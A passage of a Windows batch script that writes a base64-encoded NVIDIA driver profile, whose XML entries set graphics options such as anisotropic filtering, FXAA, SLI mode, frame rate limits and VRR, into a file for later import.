echo IDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz4gPC9T>> "!_NVNIP_B64!"
echo ZXR0aW5nTmFtZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+MTQwMTkwMTQ8L1Nl>> "!_NVNIP_B64!"
echo dHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFsdWU+>> "!_NVNIP_B64!"
echo DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwv>> "!_NVNIP_B64!"
echo UHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAg>> "!_NVNIP_B64!"
echo IDxTZXR0aW5nTmFtZUluZm8+IDwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo U2V0dGluZ0lEPjE0MDE5MDE1PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5n>> "!_NVNIP_B64!"
echo VmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3Jk>> "!_NVNIP_B64!"
echo PC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFBy>> "!_NVNIP_B64!"
echo b2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvIC8+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nSUQ+MTQzNjY4MDg8L1NldHRpbmdJRD4NCiAgICAgICAgPFNl>> "!_NVNIP_B64!"
echo dHRpbmdWYWx1ZT4zMjwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBl>> "!_NVNIP_B64!"
echo PkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAg>> "!_NVNIP_B64!"
echo ICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPlRl>> "!_NVNIP_B64!"
echo eHR1cmUgZmlsdGVyaW5nIC0gQW5pc290cm9waWMgc2FtcGxlIG9wdGltaXphdGlv>> "!_NVNIP_B64!"
echo bjwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjE1MTUxNjMz>> "!_NVNIP_B64!"
echo PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MTwvU2V0dGluZ1Zh>> "!_NVNIP_B64!"
echo bHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAg>> "!_NVNIP_B64!"
echo ICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAg>> "!_NVNIP_B64!"
echo ICAgICA8U2V0dGluZ05hbWVJbmZvPkVuYWJsZSBOSVMgMi4wIEtNRCBOT1RJRklD>> "!_NVNIP_B64!"
echo QVRJT048L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yODAy>> "!_NVNIP_B64!"
echo NzkzOTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjA8L1NldHRp>> "!_NVNIP_B64!"
echo bmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0K>> "!_NVNIP_B64!"
echo ICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5WaXJ0dWFsIFJlYWxpdHkgcHJlLXJl>> "!_NVNIP_B64!"
echo bmRlcmVkIGZyYW1lczwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z0lEPjI2OTU1Mzk3MTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVl>> "!_NVNIP_B64!"
echo PjE8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFs>> "!_NVNIP_B64!"
echo dWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxl>> "!_NVNIP_B64!"
echo U2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5XaGlzcGVyIE1vZGU8>> "!_NVNIP_B64!"
echo L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yNjk1NzMyNTg8>> "!_NVNIP_B64!"
echo L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFs>> "!_NVNIP_B64!"
echo dWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAg>> "!_NVNIP_B64!"
echo IDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nTmFtZUluZm8+V2hpc3BlciBNb2RlIEFwcGxpY2F0aW9uIEZQ>> "!_NVNIP_B64!"
echo UzwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjI2OTU3MzI1>> "!_NVNIP_B64!"
echo OTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjA8L1NldHRpbmdW>> "!_NVNIP_B64!"
echo YWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAg>> "!_NVNIP_B64!"
echo ICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAg>> "!_NVNIP_B64!"
echo ICAgICAgPFNldHRpbmdOYW1lSW5mbz5GbGFnIHRvIGNvbnRyb2wgc21vb3RoIEFG>> "!_NVNIP_B64!"
echo UiBiZWhhdmlvcjwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lE>> "!_NVNIP_B64!"
echo PjI3MDE5ODYyNzwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjA8>> "!_NVNIP_B64!"
echo L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVU>> "!_NVNIP_B64!"
echo eXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0>> "!_NVNIP_B64!"
echo dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5Bbmlzb3Ryb3BpYyBmaWx0>> "!_NVNIP_B64!"
echo ZXJpbmcgc2V0dGluZzwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z0lEPjI3MDQyNjUzNzwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVl>> "!_NVNIP_B64!"
echo PjE8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFs>> "!_NVNIP_B64!"
echo dWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxl>> "!_NVNIP_B64!"
echo U2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5TTEkgaW5kaWNhdG9y>> "!_NVNIP_B64!"
echo PC9TZXR0aW5nTmFtZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+MjcxMDg1NjQ5>> "!_NVNIP_B64!"
echo PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+ODc3ODcxMjA0PC9T>> "!_NVNIP_B64!"
echo ZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlw>> "!_NVNIP_B64!"
echo ZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRp>> "!_NVNIP_B64!"
echo bmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUluZm8+TlZJRElBIHByZWRlZmluZWQg>> "!_NVNIP_B64!"
echo U0xJIG1vZGU8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4y>> "!_NVNIP_B64!"
echo NzE4MzA3MjE8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9T>> "!_NVNIP_B64!"
echo ZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlw>> "!_NVNIP_B64!"
echo ZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRp>> "!_NVNIP_B64!"
echo bmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUluZm8+TlZJRElBIHByZWRlZmluZWQg>> "!_NVNIP_B64!"
echo U0xJIG1vZGUgb24gRGlyZWN0WCAxMDwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAg>> "!_NVNIP_B64!"
echo ICA8U2V0dGluZ0lEPjI3MTgzMDcyMjwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0>> "!_NVNIP_B64!"
echo dGluZ1ZhbHVlPjA8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5E>> "!_NVNIP_B64!"
echo d29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAg>> "!_NVNIP_B64!"
echo IDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5TTEkg>> "!_NVNIP_B64!"
echo cmVuZGVyaW5nIG1vZGU8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRp>> "!_NVNIP_B64!"
echo bmdJRD4yNzE4MzA3Mzc8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1>> "!_NVNIP_B64!"
echo ZT4wPC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1Zh>> "!_NVNIP_B64!"
echo bHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmls>> "!_NVNIP_B64!"
echo ZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUluZm8+TnVtYmVyIG9mIEdQ>> "!_NVNIP_B64!"
echo VXMgdG8gdXNlIG9uIFNMSSByZW5kZXJpbmcgbW9kZTwvU2V0dGluZ05hbWVJbmZv>> "!_NVNIP_B64!"
echo Pg0KICAgICAgICA8U2V0dGluZ0lEPjI3MTgzNDMyMTwvU2V0dGluZ0lEPg0KICAg>> "!_NVNIP_B64!"
echo ICAgICA8U2V0dGluZ1ZhbHVlPjA8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZh>> "!_NVNIP_B64!"
echo bHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGlu>> "!_NVNIP_B64!"
echo Zz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1l>> "!_NVNIP_B64!"
echo SW5mbz5OVklESUEgcHJlZGVmaW5lZCBudW1iZXIgb2YgR1BVcyB0byB1c2Ugb24g>> "!_NVNIP_B64!"
echo U0xJIHJlbmRlcmluZyBtb2RlPC9TZXR0aW5nTmFtZUluZm8+DQogICAgICAgIDxT>> "!_NVNIP_B64!"
echo ZXR0aW5nSUQ+MjcxODM0MzIyPC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5n>> "!_NVNIP_B64!"
echo VmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3Jk>> "!_NVNIP_B64!"
echo PC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFBy>> "!_NVNIP_B64!"
echo b2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPk5WSURJQSBw>> "!_NVNIP_B64!"
echo cmVkZWZpbmVkIG51bWJlciBvZiBHUFVzIHRvIHVzZSBvbiBTTEkgcmVuZGVyaW5n>> "!_NVNIP_B64!"
echo IG1vZGUgb24gRGlyZWN0WCAxMDwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo U2V0dGluZ0lEPjI3MTgzNDMyMzwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z1ZhbHVlPjA8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29y>> "!_NVNIP_B64!"
echo ZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQ>> "!_NVNIP_B64!"
echo cm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5OVklESUEg>> "!_NVNIP_B64!"
echo UHJlZGVmaW5lZCBGWEFBIFVzYWdlPC9TZXR0aW5nTmFtZUluZm8+DQogICAgICAg>> "!_NVNIP_B64!"
echo IDxTZXR0aW5nSUQ+MjcxODk1NDMzPC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nVmFsdWU+MTwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3>> "!_NVNIP_B64!"
echo b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAg>> "!_NVNIP_B64!"
echo PFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPkxpc3Qg>> "!_NVNIP_B64!"
echo b2YgVW5pdmVyc2FsIEdQVSBpZHM8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFNldHRpbmdJRD4yNzE5MjkzMzY8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRp>> "!_NVNIP_B64!"
echo bmdWYWx1ZT5ub25lPC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+>> "!_NVNIP_B64!"
echo U3RyaW5nPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAg>> "!_NVNIP_B64!"
echo ICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPk5W>> "!_NVNIP_B64!"
echo SURJQSBQcmVkZWZpbmVkIEFuc2VsIFVzYWdlPC9TZXR0aW5nTmFtZUluZm8+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxTZXR0aW5nSUQ+MjcxOTY1MDY1PC9TZXR0aW5nSUQ+DQogICAgICAg>> "!_NVNIP_B64!"
echo IDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVU>> "!_NVNIP_B64!"
echo eXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0K>> "!_NVNIP_B64!"
echo ICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZv>> "!_NVNIP_B64!"
echo Pk5vIG92ZXJyaWRlIG9mIEFuaXNvdHJvcGljIGZpbHRlcmluZzwvU2V0dGluZ05h>> "!_NVNIP_B64!"
echo bWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjI3MjM1NDQ4NTwvU2V0dGluZ0lE>> "!_NVNIP_B64!"
echo Pg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjE8L1NldHRpbmdWYWx1ZT4NCiAgICAg>> "!_NVNIP_B64!"
echo ICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxl>> "!_NVNIP_B64!"
echo U2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRp>> "!_NVNIP_B64!"
echo bmdOYW1lSW5mbz5OVklESUEgUXVhbGl0eSB1cHNjYWxpbmc8L1NldHRpbmdOYW1l>> "!_NVNIP_B64!"
echo SW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yNzI5MDkzODA8L1NldHRpbmdJRD4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFsdWU+DQogICAgICAg>> "!_NVNIP_B64!"
echo IDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNl>> "!_NVNIP_B64!"
echo dHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5n>> "!_NVNIP_B64!"
echo TmFtZUluZm8+QXBwbGljYXRpb24gUHJvZmlsZSBOb3RpZmljYXRpb24gUG9wdXAg>> "!_NVNIP_B64!"
echo VGltZW91dDwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjI3>> "!_NVNIP_B64!"
echo Mjk3OTEyNjwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjA8L1Nl>> "!_NVNIP_B64!"
echo dHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBl>> "!_NVNIP_B64!"
echo Pg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGlu>> "!_NVNIP_B64!"
echo Zz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5Qb3dlciBtYW5hZ2VtZW50IG1v>> "!_NVNIP_B64!"
echo ZGU8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yNzQxOTcz>> "!_NVNIP_B64!"
echo NjE8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4xPC9TZXR0aW5n>> "!_NVNIP_B64!"
echo VmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAg>> "!_NVNIP_B64!"
echo ICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxTZXR0aW5nTmFtZUluZm8+RG8gbm90IGRpc3BsYXkgdGhpcyBwcm9m>> "!_NVNIP_B64!"
echo aWxlIGluIHRoZSBDb250cm9sIFBhbmVsPC9TZXR0aW5nTmFtZUluZm8+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nSUQ+Mjc1NjAyNjg3PC9TZXR0aW5nSUQ+DQogICAgICAgIDxT>> "!_NVNIP_B64!"
echo ZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBl>> "!_NVNIP_B64!"
echo PkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAg>> "!_NVNIP_B64!"
echo ICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPkVu>> "!_NVNIP_B64!"
echo YWJsZSBGWEFBPC9TZXR0aW5nTmFtZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+>> "!_NVNIP_B64!"
echo Mjc2MDg5MjAyPC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MDwv>> "!_NVNIP_B64!"
echo U2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5>> "!_NVNIP_B64!"
echo cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0>> "!_NVNIP_B64!"
echo aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPkVuYWJsZSBBbnNlbDwvU2V0>> "!_NVNIP_B64!"
echo dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjI3NjE1ODgzNDwvU2V0>> "!_NVNIP_B64!"
echo dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjA8L1NldHRpbmdWYWx1ZT4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Q>> "!_NVNIP_B64!"
echo cm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFNldHRpbmdOYW1lSW5mbz5BbnRpYWxpYXNpbmcgLSBTTEkgQUE8L1NldHRpbmdO>> "!_NVNIP_B64!"
echo YW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yNzY0OTU0NTE8L1NldHRpbmdJ>> "!_NVNIP_B64!"
echo RD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFsdWU+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmls>> "!_NVNIP_B64!"
echo ZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nTmFtZUluZm8+QW50aWFsaWFzaW5nIC0gR2FtbWEgY29ycmVjdGlvbjwvU2V0>> "!_NVNIP_B64!"
echo dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjI3NjY1Mjk1NzwvU2V0>> "!_NVNIP_B64!"
echo dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjA8L1NldHRpbmdWYWx1ZT4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Q>> "!_NVNIP_B64!"
echo cm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFNldHRpbmdOYW1lSW5mbz5BbnRpYWxpYXNpbmcgLSBNb2RlPC9TZXR0aW5nTmFt>> "!_NVNIP_B64!"
echo ZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+Mjc2NzU3NTk1PC9TZXR0aW5nSUQ+>> "!_NVNIP_B64!"
echo DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAg>> "!_NVNIP_B64!"
echo ICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVT>> "!_NVNIP_B64!"
echo ZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z05hbWVJbmZvPlBsYXRmb3JtIEJvb3N0PC9TZXR0aW5nTmFtZUluZm8+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nSUQ+Mjc3MDQxMTUwPC9TZXR0aW5nSUQ+DQogICAgICAgIDxT>> "!_NVNIP_B64!"
echo ZXR0aW5nVmFsdWU+MTwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBl>> "!_NVNIP_B64!"
echo PkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAg>> "!_NVNIP_B64!"
echo ICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPkZS>> "!_NVNIP_B64!"
echo TCBMb3cgTGF0ZW5jeTwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z0lEPjI3NzA0MTE1MjwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVl>> "!_NVNIP_B64!"
echo PjA8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFs>> "!_NVNIP_B64!"
echo dWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxl>> "!_NVNIP_B64!"
echo U2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5GcmFtZSBSYXRlIExp>> "!_NVNIP_B64!"
echo bWl0ZXI8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4yNzcw>> "!_NVNIP_B64!"
echo NDExNTQ8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0>> "!_NVNIP_B64!"
echo aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4N>> "!_NVNIP_B64!"
echo CiAgICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+>> "!_NVNIP_B64!"
echo DQogICAgICAgIDxTZXR0aW5nTmFtZUluZm8+QmFja2dyb3VuZCBBcHBsaWNhdGlv>> "!_NVNIP_B64!"
echo biBNYXggRnJhbWUgUmF0ZTwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0>> "!_NVNIP_B64!"
echo dGluZ0lEPjI3NzA0MTE1NzwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1Zh>> "!_NVNIP_B64!"
echo bHVlPjA8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwv>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9m>> "!_NVNIP_B64!"
echo aWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5CYWNrZ3JvdW5k>> "!_NVNIP_B64!"
echo IEFwcGxpY2F0aW9uIE1heCBGcmFtZSBSYXRlIG9ubHkgZm9yIE5WQ1BMIHRvIG1h>> "!_NVNIP_B64!"
echo aW50YWluIHRoZSBwcmV2aW91cyBzbGlkZXIgdmFsdWUgd2hlbiB0aGUgQkdfRlJM>> "!_NVNIP_B64!"
echo X0ZQUyBpcyBzZXQgdG8gRGlzYWJsZWQuPC9TZXR0aW5nTmFtZUluZm8+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nSUQ+Mjc3MDQxMTU4PC9TZXR0aW5nSUQ+DQogICAgICAgIDxT>> "!_NVNIP_B64!"
echo ZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBl>> "!_NVNIP_B64!"
echo PkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAg>> "!_NVNIP_B64!"
echo ICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPkZy>> "!_NVNIP_B64!"
echo YW1lIFJhdGUgTGltaXRlciBmb3IgTlZDUEw8L1NldHRpbmdOYW1lSW5mbz4NCiAg>> "!_NVNIP_B64!"
echo ICAgICAgPFNldHRpbmdJRD4yNzcwNDExNjI8L1NldHRpbmdJRD4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5>> "!_NVNIP_B64!"
echo cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+DQog>> "!_NVNIP_B64!"
echo ICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUluZm8+>> "!_NVNIP_B64!"
echo VG9nZ2xlIHRoZSBWUlIgZ2xvYmFsIGZlYXR1cmU8L1NldHRpbmdOYW1lSW5mbz4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFNldHRpbmdJRD4yNzgxOTY1Njc8L1NldHRpbmdJRD4NCiAgICAg>> "!_NVNIP_B64!"
echo ICAgPFNldHRpbmdWYWx1ZT4xPC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1>> "!_NVNIP_B64!"
echo ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+>> "!_NVNIP_B64!"
echo DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUlu>> "!_NVNIP_B64!"
